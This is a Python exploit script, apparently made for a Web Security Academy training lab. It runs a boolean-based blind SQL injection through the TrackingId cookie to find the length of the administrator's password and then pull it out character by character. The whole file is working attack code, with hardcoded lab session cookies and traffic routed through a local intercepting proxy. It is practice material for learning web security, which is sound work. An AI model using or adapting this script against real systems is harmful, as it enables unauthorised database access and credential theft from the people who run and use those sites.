# TODO: use sys to turn this into a proper script with argument inputs

import sys

import requests
import urllib3

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WEBSITE_URL = (
    "https://0aad00e404cdb49b80f5124d003700df.web-security-academy.net"
)


def get_pass_length(s: requests.Session, url: str):
    found = False
    username = "administrator"
    length = 0
    payload = (
        f"{s.cookies.get('TrackingId')}"
        "' AND (SELECT username FROM users"
        f" WHERE username='{username}'"
        " AND LENGTH(password)>{length})"
        f"='{username}'--"
    )

    for i in range(50):
        _ = s.cookies.set("TrackingId", None)
        _ = s.cookies.set("TrackingId", payload.format(length=i))
        r = s.get(url)
        print(s.cookies.get_dict())
        if "Welcome" not in r.text:
            found = True
            break
        else:
            length += 1

    if found:
        print(f"[+] Length of the password is: {length}")
    else:
        print("[-] Could not find the length of the password!")

    _ = s.cookies.set("TrackingId", None)
    _ = s.cookies.set("TrackingId", "EDUNf4YCCjqCR17u")
    _ = s.cookies.set("session", None)
    _ = s.cookies.set("session", "CRvOJEmOJfirimG41SDvcfC6yE1smBfw")

    return length


def cluster_bomb(s: requests.Session, url: str, length: int):
    found = False
    username = "administrator"
    password = ""
    payload = (
        f"{s.cookies.get('TrackingId')}"
        "' AND (SELECT SUBSTRING(password, {position}, 1) FROM users"
        f" WHERE username='{username}')"
        "='{character}'--"
    )

    # WARNING: the index MUST start from 1 and not 0!
    for i in range(1, length + 1):
        letter_found = False
        for j in range(32, 127):
            _ = s.cookies.set("TrackingId", None)
            _ = s.cookies.set(
                "TrackingId", payload.format(position=i, character=chr(j))
            )

            r = s.get(url)
            if "Welcome" in r.text:
                letter_found = True
                password += chr(j)
                _ = sys.stdout.write("\r" + password)
                _ = sys.stdout.flush()
                break
            else:
                _ = sys.stdout.write("\r" + password + chr(j))
                _ = sys.stdout.flush()

        if not letter_found:
            print("[-] Failed to find letter")
            break

    found = True if password else False

    if found:
        print(f"[+] Password found is: {password}")
    else:
        print("[-] Failed to find password!")

    _ = s.cookies.set("TrackingId", None)
    _ = s.cookies.set("TrackingId", "EDUNf4YCCjqCR17u")
    _ = s.cookies.set("session", None)
    _ = s.cookies.set("session", "CRvOJEmOJfirimG41SDvcfC6yE1smBfw")


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    s.proxies = proxies
    _ = s.get(WEBSITE_URL)
    _ = s.cookies.set("TrackingId", None)
    _ = s.cookies.set("TrackingId", "EDUNf4YCCjqCR17u")
    _ = s.cookies.set("session", None)
    _ = s.cookies.set("session", "CRvOJEmOJfirimG41SDvcfC6yE1smBfw")
    length = get_pass_length(s, WEBSITE_URL)
    cluster_bomb(s, WEBSITE_URL, length)
